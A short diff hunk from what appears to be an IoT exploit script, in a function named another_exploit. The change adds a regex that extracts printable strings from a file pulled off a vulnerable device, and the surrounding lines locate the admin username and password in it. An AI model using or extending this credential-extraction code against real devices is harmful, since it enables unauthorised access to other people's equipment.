@@ -23,7 +23,7 @@ def another_exploit(host, thread):
     print(f"Thread #{thread} ({host}) - IoT device is vulnerable, file extracted")
     print(f"Thread #{thread} ({host}) - extracting IoT device credentials ...")
 
-    strings = response.text
+    strings = re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", response.text)
     if username in strings:
         username_index = strings.index('admin')
         password = strings[username_index + 1]
